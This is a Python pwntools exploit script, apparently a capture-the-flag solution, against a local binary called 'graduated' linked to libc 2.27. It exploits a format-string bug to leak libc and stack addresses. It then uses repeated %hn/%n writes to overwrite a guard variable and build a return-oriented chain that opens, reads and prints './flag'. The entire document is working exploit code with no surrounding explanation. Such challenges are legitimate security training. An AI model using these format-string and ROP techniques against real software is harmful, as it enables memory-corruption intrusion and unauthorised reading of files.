from pwn import *

p =process("./graduated")

libc = elf.ELF('libc-2.27.so')

open_offset = libc.symbols['open']
read_offset = libc.symbols['read']
write_offset = libc.symbols['write']
exit_offset = libc.symbols['exit']

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p,
'''
brva 0xcde
brva 0xd75
'''#)

#raw_input("wait")

p.sendline("10499292")
p.sendline("1")

def leak(offset):
	p.sendline("%"+ "%s$lx" % offset)
	p.recvuntil("Oh dear old... ")
	leak = p.recvline()[:-1]
	return leak


###############Leaking libc address
addr_libc = int(leak("16"),16)
print "Leaked address @ %s" % hex(addr_libc)
start_libc = addr_libc - 0x1b3787
print "Base libc address @ %s" % hex(start_libc)

###############Leaking useful stack address (it contains a variable we have to change to reach ret instruction)
addr_stack = int(leak("18"),16)
print "Leaked address @ %s" % hex(addr_stack)
addr_cfu = addr_stack - 0x80
print "Cfu variable address @ %s" % hex(addr_cfu)

###############Leaking saved_ret address
saved_ret_addr = addr_cfu+0x128
print "Saved return address @ %s" % hex(saved_ret_addr)

###############Needed gadget
pop_rsi = start_libc+ 0x0000000000023e6a
pop_rdi = start_libc + 0x000000000002155f
pop_rdx = start_libc + 0x0000000000001b96

#function used to put on the stack the address where I'll write with the %n
def send_address():
	p.sendline("A"*61 + "C"*3 + p64(where_to_write)+p64(where_to_write+2)+p64(where_to_write+4)+p64(where_to_write+6))

def format_string(what_to_write, where_to_write, flag):
	displacement = 18
	first_4 = what_to_write & 0xffff
	second_4 = (what_to_write & 0xffff0000) >> 16
	third_4 = (what_to_write & 0xffff00000000) >> 32

	send_address()
	p.sendline("%{}c%{}$hn".format(first_4, displacement))
	p.sendline("%{}c%{}$hn".format(second_4, displacement+1))
	if (flag == 0):
		p.sendline("%{}c%{}$hn".format(third_4, displacement+2))
	elif (flag == 1):
		p.sendline("%{}c%{}$n".format(third_4, displacement+2))



###############modifing my_cfu to needed_cfu value
what_to_write = 0x78
where_to_write = addr_cfu
send_address()
p.sendline("%{}c%{}$n".format(what_to_write, 18))

	
###############Writing rop chain through multiple string format
#########1) Open("./flag")

####1.1)Writing "./flag" on the stack
what_to_write = 0x0067616c662f2e
where_to_write = addr_stack
format_string(what_to_write, where_to_write, 0)


####1.2)pop_rdi
what_to_write = pop_rdi
where_to_write = saved_ret_addr
format_string(what_to_write, where_to_write, 0)

###1.3)writing what we pop
what_to_write = addr_stack
where_to_write = where_to_write+0x8
format_string(what_to_write, where_to_write, 0)

###1.4)pop_rsi 3 times(we need a 0)
what_to_write = pop_rsi
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 0)

what_to_write = pop_rsi
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 0)

what_to_write = pop_rsi
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 0)

###1.5)Syscall
what_to_write = start_libc+open_offset
where_to_write = where_to_write+0x10
format_string(what_to_write, where_to_write, 1)


#########2) Read from flag (fd = 0x3)
###2.1)pop rdi
what_to_write = pop_rdi
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 0)

###2.2) writing 3 (for the pop)
what_to_write = 0x3
where_to_write = where_to_write + 0x8
send_address()
displacement = 18
first_4 = what_to_write & 0xffff
p.sendline("%{}c%{}$ln".format(first_4, displacement))

###2.3)pop rdx (number of byte to read)
what_to_write = pop_rdx
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 0)

###2.4)writing number of bytes
what_to_write = 0x100
where_to_write = where_to_write + 0x8
send_address()
displacement = 18
first_4 = what_to_write & 0xffff
p.sendline("%{}c%{}$hn".format(first_4, displacement))

###2.5)syscall
what_to_write = start_libc + read_offset
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 1)

#########3) write the flag to stdout
###3.1)pop_rdi
what_to_write = pop_rdi
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 1)

###3.2)write 1 for the pop
what_to_write = 0x1
where_to_write = where_to_write + 0x8
send_address()
displacement = 18
first_4 = what_to_write & 0xffff
p.sendline("%{}c%{}$ln".format(first_4, displacement))

###3.3)syscall
what_to_write = start_libc + write_offset
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 1)

#########4) exit
what_to_write = start_libc + exit_offset
where_to_write = where_to_write + 0x8
format_string(what_to_write, where_to_write, 1)


p.sendline("end")

p.interactive()

